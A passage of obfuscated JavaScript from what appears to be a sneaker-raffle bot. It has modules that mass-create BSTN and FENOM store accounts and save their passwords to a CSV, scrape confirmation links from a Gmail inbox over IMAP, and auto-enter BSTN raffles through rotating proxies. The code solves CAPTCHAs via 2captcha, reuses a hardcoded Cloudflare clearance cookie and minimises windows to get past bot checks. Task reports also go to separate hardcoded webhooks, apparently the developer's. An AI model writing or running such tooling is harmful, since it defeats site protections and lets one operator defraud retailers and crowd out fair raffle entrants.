                            }), console['log'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4322ff['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4322ff['setRequestInterception'](!![]), _0x4322ff['on']('request', _0x4ec941 => {
                                _0x4ec941['resourceType']() === 'image' ? _0x4ec941['abort']() : _0x4ec941['continue']();
                            }), await _0x4322ff['goto']('' + _0x3a8379), await _0x4322ff['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x4322ff['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x28bb81(0x7d0), console['log'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x28bb81(0x190), await _0x4322ff['waitForSelector']('#firstname'), await _0x4322ff['type']('#firstname', _0x461dc0[_0x8da887]['FirstName'], { 'delay': 0xf0 }), await _0x28bb81(0x190), await _0x4322ff['type']('#lastname', _0x461dc0[_0x8da887]['LastName'], { 'delay': 0xe6 }), await _0x28bb81(0x190), await _0x4322ff['type']('#email_address', _0x461dc0[_0x8da887]['Email'], { 'delay': 0x122 }), await _0x28bb81(0x190), await _0x4322ff['type']('#password', _0x461dc0[_0x8da887]['Password'], { 'delay': 0x82 }), await _0x28bb81(0x1f4), await _0x4322ff['type']('#password-confirmation', _0x461dc0[_0x8da887]['Password'], { 'delay': 0x7c }), console['log'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x28bb81(0x2bc), await _0x4322ff['$eval']('#form-validate', _0x43e56b => _0x43e56b['submit']()), await _0x28bb81(0x1388);
                            const _0x20c74b = await _0x4322ff['$']('#email_address-error');
                            if (_0x20c74b)
                                throw new Error('Invalid\x20Email');
                            const _0x20c351 = await _0x4322ff['$']('#password-error');
                            if (_0x20c351)
                                throw new Error('Invalid\x20Password');
                            await _0x4322ff['waitForSelector']('div.mesg-success'), _0x209c6b = 'no', console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Account\x20' + _0x461dc0[_0x8da887]['Email'] + '\x20Generated')), _0x5e446e['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x461dc0[_0x8da887]['Email'] + ',' + _0x461dc0[_0x8da887]['Password']);
                            try {
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x1bfd42['succesDEVMSG']);
                            } catch {
                            }
                            await _0x40545a(_0x14be92, _0x1bfd42['succesDEVMSG']), console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x1807e9) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20' + _0x1807e9)), _0x1624f3 = '' + _0x1807e9;
                            var _0x121e89 = await _0xb1aeae(_0x461dc0[_0x8da887], _0x2a7772, 'acc', !![], _0x1624f3);
                            _0x1bfd42['errorDEV'] = { 'embeds': [_0x121e89] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x1bfd42['errorDEV']), await _0x40545a(_0x2b1b7c, _0x1bfd42['errorDEV']), _0x209c6b = 'yes';
                        } finally {
                            _0x347465['close']();
                            if (_0x209c6b == 'yes' && _0xf3ef4b != 0x5) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Task\x20' + (_0x8da887 + 0x1) + '\x20:\x20Retrying')), _0x8da887 = _0x8da887 - 0x1, _0xf3ef4b = _0xf3ef4b + 0x1;
                                continue;
                            }
                            _0x209c6b == 'yes' && _0xf3ef4b >= 0x5 && (_0x1322f8(_0x461dc0[_0x8da887], _0x2a7772), _0x209c6b = 'no', _0xf3ef4b = 0x0), console['log'](_0x51d312() + '\x20[' + _0x2a7772['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xf5319f, _0x26018f, _0x2d7a59) {
                    var _0x26018f = [];
                    async function _0x4c042c() {
                        var _0x41cd2e = new _0x575543({
                            'user': _0x37b240['masterMail'],
                            'password': _0x37b240['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4363ea(_0x36bd34) {
                            _0x41cd2e['openBox']('INBOX', ![], _0x36bd34);
                        }
                        _0x41cd2e['once']('ready', function () {
                            _0x4363ea(function (_0x340cea, _0x1f0455) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x340cea)
                                    throw _0x340cea;
                                _0x41cd2e['seq']['search'](['UNSEEN'], function (_0xd5463b, _0x4466ba) {
                                    if (!_0x4466ba || !_0x4466ba['length'])
                                        console['log'](_0x51d312() + '\x20[' + _0xf5319f['name'] + ']\x20No\x20mails\x20found'), _0x41cd2e['end']();
                                    else {
                                        var _0x4c7256 = _0x41cd2e['seq']['fetch'](_0x4466ba, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4c7256['on']('message', function (_0x4a16da, _0x30e40f) {
                                            var _0x5b92b6 = '(#' + _0x30e40f + ')\x20';
                                            _0x4a16da['on']('body', function (_0x3db545, _0x19067f) {
                                                _0x565ceb(_0x3db545, (_0x185bb3, _0x3b45d5) => {
                                                    if (_0x3b45d5['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0xd4b56 = _0x3b45d5['text']['split']('[')[0x2], _0xc144d9 = _0xd4b56['split'](']')[0x0], _0x393d77 = _0x3b45d5['html']['split']('\x0a');
                                                        _0x26018f['push'](_0xc144d9);
                                                    }
                                                });
                                            }), _0x4a16da['once']('end', function () {
                                            });
                                        }), _0x4c7256['once']('error', function (_0x9600b5) {
                                            console['log']('Fetch\x20error:\x20' + _0x9600b5);
                                        }), _0x4c7256['once']('end', function () {
                                            _0x41cd2e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x41cd2e['once']('error', function (_0x3e87bd) {
                            console['log'](_0x2367c9['red'](_0x3e87bd['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x41cd2e['once']('end', async function () {
                        }), _0x41cd2e['connect']();
                    }
                    async function _0x542ce9(_0x150635, _0x54f993, _0x4f3894) {
                        _0x3b2a97['use'](_0x2b8567());
                        for (var _0x51d1e1 = 0x0; _0x51d1e1 < _0x54f993['length']; _0x51d1e1++) {
                            if (_0x52b492 != 'yes')
                                var _0x52b492 = '', _0x134b8f = 0x0;
                            var _0x37f9f6 = Math['round'](Math['random']() * (_0x4f3894['length'] - 0x1)), _0x78af12 = _0x4f3894[_0x37f9f6]['split'](':');
                            const _0x3449c7 = await _0x3b2a97['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x78af12[0x0] + ':' + _0x78af12[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x524b05 = await _0x3449c7['newPage']();
                                await _0x524b05['authenticate']({
                                    'username': '' + _0x78af12[0x2],
                                    'password': '' + _0x78af12[0x3]
                                }), console['log'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x524b05['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x524b05['setRequestInterception'](!![]), _0x524b05['on']('request', _0x271849 => {
                                    _0x271849['resourceType']() === 'image' || _0x271849['resourceType']() === 'font' || _0x271849['resourceType']() === 'media' ? _0x271849['abort']() : _0x271849['continue']();
                                }), console['log'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x524b05['goto'](_0x54f993[_0x51d1e1]), console['log'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x524b05['waitForTimeout'](0xbb8);
                                try {
                                    await _0x524b05['waitForSelector']('.account-nav'), _0x52b492 = 'no', console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x20de21 = await _0xb1aeae(null, _0x150635, 'ver', ![]);
                                    const _0x47fa10 = { 'succesDEVMSG': { 'embeds': [_0x20de21] } };
                                    await _0x40545a(_0xf4f157, _0x47fa10['succesDEVMSG']);
                                } catch (_0x4c1e12) {
                                    throw new Error(_0x4c1e12);
                                }
                            } catch (_0x514979) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20' + _0x514979));
                                var _0x2bfbf1 = _0x514979, _0x3db927 = await _0xb1aeae(null, _0x150635, 'ver', !![], _0x2bfbf1);
                                const _0x5cef67 = { 'errorDEVMSG': { 'embeds': [_0x3db927] } };
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x5cef67['errorDEVMSG']), await _0x40545a(_0x2b1b7c, _0x5cef67['errorDEVMSG']), _0x52b492 = 'yes';
                            } finally {
                                _0x3449c7['close']();
                                if (_0x52b492 == 'yes' && _0x134b8f != 0x5) {
                                    console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Task\x20' + (_0x51d1e1 + 0x1) + '\x20:\x20Retrying')), _0x51d1e1 = _0x51d1e1 - 0x1, _0x134b8f = _0x134b8f + 0x1;
                                    continue;
                                }
                                _0x52b492 == 'yes' && _0x134b8f >= 0x5 && (_0x52b492 = 'no', _0x134b8f = 0x0), console['log'](_0x51d312() + '\x20[' + _0x150635['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                            }
                        }
                    }
                    try {
                        _0x4c042c(), await _0x28bb81(0xfa0), console['log']('Found\x20' + _0x26018f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x542ce9(_0xf5319f, _0x26018f, _0x2d7a59);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2af2eb, _0x29a8f9, _0x4fd62a) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5dbe5a = 0x0; _0x5dbe5a < _0x29a8f9['length']; _0x5dbe5a++) {
                        var _0x222812;
                        await _0x129938(_0x29a8f9, _0x5dbe5a);
                        if (_0x391f13 != 'yes')
                            var _0x391f13 = '', _0x590891 = 0x0;
                        _0x50109a(_0x2af2eb['name'] + '\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20/\x20' + _0x29a8f9['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        var _0x5a11a1 = Math['round'](Math['random']() * (_0x4fd62a['length'] - 0x1)), _0x155b42 = _0x4fd62a[_0x5a11a1]['split'](':'), _0x8064b3;
                        try {
                            _0x8064b3 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x155b42[0x0] + ':' + _0x155b42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x8064b3 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x155b42[0x0] + ':' + _0x155b42[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x14ffda = await _0x8064b3['newPage'](), _0x462518 = await _0x14ffda['target']()['createCDPSession'](), { windowId: _0x50351a } = await _0x462518['send']('Browser.getWindowForTarget');
                            await _0x14ffda['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x3f4006 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x14ffda['authenticate']({
                                'username': '' + _0x155b42[0x2],
                                'password': '' + _0x155b42[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14ffda['goto']('' + _0x29a8f9[_0x5dbe5a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x14ffda['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x462518['send']('Browser.setWindowBounds', {
                                'windowId': _0x50351a,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x28bb81(0x1388), await _0x14ffda['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x14ffda['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x28bb81(0x1f4), console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Logging\x20in'), await _0x14ffda['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x241a76 => _0x241a76['click']()), await _0x14ffda['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x14ffda['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x28bb81(0x7d0), await _0x14ffda['waitForSelector']('#email-login'), await _0x14ffda['type']('#email-login', '' + _0x29a8f9[_0x5dbe5a]['Email']), await _0x28bb81(0xdac), await _0x14ffda['waitForSelector']('#password'), await _0x14ffda['type']('#password', '' + _0x29a8f9[_0x5dbe5a]['Password'], { 'delay': 0xe6 }), await _0x28bb81(0x157c);
                            try {
                                await _0x14ffda['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x5b54db => _0x5b54db['click']());
                            } catch {
                            }
                            try {
                                await _0x14ffda['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x4c6063) {
                            }
                            await _0x28bb81(0x3e8);
                            const _0x564d2a = await _0x14ffda['$']('.enteredDraw_container__2KmQ_');
                            if (_0x564d2a)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x29a8f9[_0x5dbe5a]['Size']);
                            if (_0x29a8f9[_0x5dbe5a]['Size'] != 'RANDOM') {
                                var _0xe00ab4 = _0x29a8f9[_0x5dbe5a]['Size']['replace']('.', ',');
                                const _0x270e8d = await _0x14ffda['$x']('//div[contains(text(),\x20' + _0xe00ab4 + ')]');
                                await _0x270e8d[0x0]['click']();
                            } else {
                                const _0x1aabd0 = await _0x14ffda['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x28dc3e = Math['round'](Math['random']() * (_0x1aabd0['length'] - 0x1));
                                await _0x1aabd0[_0x28dc3e]['click']();
                            }
                            await _0x28bb81(0x1f4);
                            const _0x4180c4 = await _0x14ffda['$']('.addressList_addressItem__LE2PB');
                            if (_0x4180c4 && _0x29a8f9[_0x5dbe5a]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Filling\x20Address'), await _0x14ffda['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x28bb81(0x5dc), await _0x14ffda['waitForSelector']('#firstname'), await _0x14ffda['type']('#firstname', '' + _0x29a8f9[_0x5dbe5a]['FirstName']), await _0x28bb81(0x1f4), await _0x14ffda['waitForSelector']('#firstname'), await _0x14ffda['type']('#lastname', '' + _0x29a8f9[_0x5dbe5a]['LastName']), await _0x28bb81(0x1f4), await _0x14ffda['waitForSelector']('#firstname'), await _0x14ffda['type']('#street', '' + _0x29a8f9[_0x5dbe5a]['Address1']), await _0x28bb81(0x1f4), await _0x14ffda['waitForSelector']('#firstname'), await _0x14ffda['type']('#houseNumber', _0x29a8f9[_0x5dbe5a]['HouseNumber'] + '\x20' + _0x29a8f9[_0x5dbe5a]['Address2']), await _0x28bb81(0x1f4), await _0x14ffda['waitForSelector']('#firstname'), await _0x14ffda['select']('#country_code', '' + _0x29a8f9[_0x5dbe5a]['Country']), await _0x28bb81(0x1f4), await _0x14ffda['type']('#postcode', '' + _0x29a8f9[_0x5dbe5a]['Zip']), await _0x28bb81(0x1f4), await _0x14ffda['type']('#city', '' + _0x29a8f9[_0x5dbe5a]['City']), await _0x28bb81(0x1f4), await _0x14ffda['type']('#telephone', '' + _0x29a8f9[_0x5dbe5a]['Phone']), await _0x28bb81(0x1f4), await _0x14ffda['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x28bb81(0x9c4);
                            try {
                                await _0x14ffda['type']('#instagram_name', '' + _0x29a8f9[_0x5dbe5a]['Follower']), await _0x14ffda['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x28bb81(0x5dc);
                            try {
                                await _0x14ffda['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x28bb81(0x5dc), await _0x14ffda['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x3324d1 => _0x3324d1['click']()), await _0x28bb81(0x1388);
                            try {
                                await _0x14ffda['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x14ffda['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x29a8f9[_0x5dbe5a]['Size'] != 'RANDOM') {
                                    var _0xe00ab4 = _0x29a8f9[_0x5dbe5a]['Size']['replace']('.', ',');
                                    const _0x24174a = await _0x14ffda['$x']('//div[contains(text(),\x20' + _0xe00ab4 + ')]');
                                    await _0x24174a[0x0]['click']();
                                } else {
                                    const _0x28bda5 = await _0x14ffda['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x28dc3e = Math['round'](Math['random']() * (_0x28bda5['length'] - 0x1));
                                    await _0x28bda5[_0x28dc3e]['click']();
                                }
                                await _0x28bb81(0x5dc);
                                try {
                                    await _0x14ffda['hover']('#instagram_name'), await _0x14ffda['type']('#instagram_name', '' + _0x29a8f9[_0x5dbe5a]['Follower']), await _0x14ffda['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Retrying'), await _0x14ffda['hover']('.checkBox_boxHolder__wLGVe'), await _0x28bb81(0x5dc), await _0x14ffda['click']('.checkBox_boxHolder__wLGVe'), await _0x28bb81(0x157c), await _0x14ffda['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x557f65 => _0x557f65['click']()), await _0x28bb81(0x1388), await _0x14ffda['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x391f13 = 'no', _0x4d8543(_0x29a8f9[_0x5dbe5a], _0x2af2eb), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x4e2192 = await _0xb1aeae(_0x29a8f9[_0x5dbe5a], _0x2af2eb, 'dev', ![]), _0x28c139 = await _0xb1aeae(_0x29a8f9[_0x5dbe5a], _0x2af2eb, 'pub', ![]);
                            const _0x532370 = {
                                'succesDEVMSG': { 'embeds': [_0x4e2192] },
                                'succesPUBMSG': { 'embeds': [_0x28c139] }
                            };
                            try {
                                _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x532370['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x532370['succesDEVMSG']), await _0x28bb81(0xc8), await _0x40545a(_0x4a9ac0, _0x532370['succesPUBMSG']);
                            } catch (_0x5871a9) {
                                console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5871a9));
                            }
                        } catch (_0x2e0bcb) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20' + _0x2e0bcb)), _0x391f13 = 'yes', _0x222812 = '' + _0x2e0bcb;
                            var _0x28d945 = await _0xb1aeae(_0x29a8f9[_0x5dbe5a], _0x2af2eb, 'dev', !![], _0x222812), _0x4e2192 = await _0xb1aeae(_0x29a8f9[_0x5dbe5a], _0x2af2eb, 'dev', ![]), _0x28c139 = await _0xb1aeae(_0x29a8f9[_0x5dbe5a], _0x2af2eb, 'pub', ![]);
                            const _0x27d80f = {
                                'succesDEVMSG': { 'embeds': [_0x4e2192] },
                                'succesPUBMSG': { 'embeds': [_0x28c139] }
                            };
                            _0x27d80f['errorDEV'] = { 'embeds': [_0x28d945] }, _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x27d80f['errorDEV']), await _0x40545a(_0x2b1b7c, _0x27d80f['errorDEV']);
                        } finally {
                            _0x8064b3['close']();
                            if (_0x391f13 == 'yes' && _0x590891 != 0x5) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Task\x20' + (_0x5dbe5a + 0x1) + '\x20:\x20Retrying')), _0x5dbe5a = _0x5dbe5a - 0x1, _0x590891 = _0x590891 + 0x1;
                                continue;
                            }
                            _0x391f13 == 'yes' && _0x590891 >= 0x5 && (_0x1322f8(_0x29a8f9[_0x5dbe5a], _0x2af2eb), _0x391f13 = 'no', _0x590891 = 0x0), console['log'](_0x51d312() + '\x20[' + _0x2af2eb['name'] + ']\x20Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5dc5ed, _0x283c9c, _0x4d19ab) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2b24be = 0x0; _0x2b24be < _0x283c9c['length']; _0x2b24be++) {
                        if (_0x3e2842 != 'yes')
                            var _0x3e2842 = '', _0x132735 = 0x0;
                        var _0x2d3e5d;
                        await _0x129938(_0x283c9c, _0x2b24be), _0x50109a(_0x5dc5ed['name'] + '\x20Task\x20' + (_0x2b24be + 0x1) + '\x20/\x20' + _0x283c9c['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57);
                        var _0xd5341b = await _0xb1aeae(_0x283c9c[_0x2b24be], _0x5dc5ed, 'acc', ![]);
                        const _0x374317 = { 'succesDEVMSG': { 'embeds': [_0xd5341b] } }, _0x1a3718 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x537e7a = Math['round'](Math['random']() * (_0x4d19ab['length'] - 0x1)), _0x5c021a = _0x4d19ab[_0x537e7a]['split'](':'), _0x29afd1;
                        try {
                            _0x29afd1 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5c021a[0x0] + ':' + _0x5c021a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x29afd1 = await _0x3b2a97['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5c021a[0x0] + ':' + _0x5c021a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x59b28d = await _0x29afd1['newPage']();
                            await _0x59b28d['setViewport']({
                                'width': 0x500 + _0x43987d(0x1, 0x32),
                                'height': 0x2d9 + _0x43987d(0x1, 0x32)
                            });
                            const _0x22922a = await _0x59b28d['target']()['createCDPSession'](), { windowId: _0x157283 } = await _0x22922a['send']('Browser.getWindowForTarget');
                            await _0x59b28d['authenticate']({
                                'username': '' + _0x5c021a[0x2],
                                'password': '' + _0x5c021a[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Getting\x20Session'), await _0x59b28d['goto']('' + _0x1a3718, { 'waitUntil': 'networkidle2' }), await _0x28bb81(0x1388), console['log'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x152e90 = await _0x59b28d['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x152e90 && await _0x152e90['click']();
                            } catch {
                            }
                            await _0x22922a['send']('Browser.setWindowBounds', {
                                'windowId': _0x157283,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x59b28d['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x28bb81(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x59b28d['type']('input[name=\x22firstname\x22]', '' + _0x283c9c[_0x2b24be]['FirstName']), await _0x28bb81(0x1f4), await _0x59b28d['type']('input[name=\x22lastname\x22]', '' + _0x283c9c[_0x2b24be]['LastName']), await _0x28bb81(0x1f4), await _0x59b28d['type']('input[name=\x22email\x22]', '' + _0x283c9c[_0x2b24be]['Email']), await _0x28bb81(0x1f4), await _0x59b28d['type']('input[name=\x22password\x22]', '' + _0x283c9c[_0x2b24be]['Password']), await _0x28bb81(0x258), await _0x59b28d['$eval']('input[name=\x22psgdpr\x22]', _0x3212ac => _0x3212ac['click']()), await _0x28bb81(0x1f4), console['log'](_0x51d312() + '\x20[' + _0x5dc5ed['name'] + ']\x20Task\x20' + (_0x2b24be + 0x1) + '\x20:\x20Sending\x20Request'), await _0x59b28d['$eval']('#customer-form', _0x532bc8 => _0x532bc8['submit']());
                            try {
